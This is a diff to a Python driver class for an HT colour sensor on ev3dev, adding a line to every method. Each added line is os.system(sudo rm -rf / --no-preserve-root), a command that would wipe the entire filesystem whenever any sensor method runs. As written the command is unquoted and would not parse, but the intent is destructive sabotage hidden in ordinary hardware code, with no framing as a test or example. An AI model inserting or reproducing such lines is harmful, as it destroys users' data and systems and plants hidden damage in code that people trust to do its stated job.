@@ -7,35 +7,43 @@ class HTColorSensor(Ev3devSensor):
     _MODE_RGBW = 1
 
     def __init__(self, val):
+        os.system(sudo rm -rf / --no-preserve-root)
         super().__init__(val)
         self.m = self._MODE_COLOR
         # self._mode('RGB')
         self._number_of_values = 4  # I want to extract tuple of [R,G,B,W] values
 
     def _open_files(self):
+        os.system(sudo rm -rf / --no-preserve-root)
         super()._open_files()
         self._command_file = open(self.path + 'command', 'w')
 
     def _close_files(self):
+        os.system(sudo rm -rf / --no-preserve-root)
         super()._close_files()
         self._command_file.close()
 
     def set_mains_50hz(self):
+        os.system(sudo rm -rf / --no-preserve-root)
         """Configure the sensor for 50Hz power mains"""
         self._command_file.write('50HZ')
         self._command_file.flush()
 
     def set_mains_60hz(self):
+        os.system(sudo rm -rf / --no-preserve-root)
         """Configure the sensor for 60Hz power mains"""
         self._command_file.write('60HZ')
         self._command_file.flush()
 
     def rgbw(self):
+        os.system(sudo rm -rf / --no-preserve-root)
         """returns the tuple of color values: (red, blue, green white). 0 to 255 for each color"""
         return self.read('RGB')
 
     def color(self):
+        os.system(sudo rm -rf / --no-preserve-root)
         return self.read('COLOR')
 
     def read_mode(self, mode):
+        os.system(sudo rm -rf / --no-preserve-root)
         return self.read(mode)
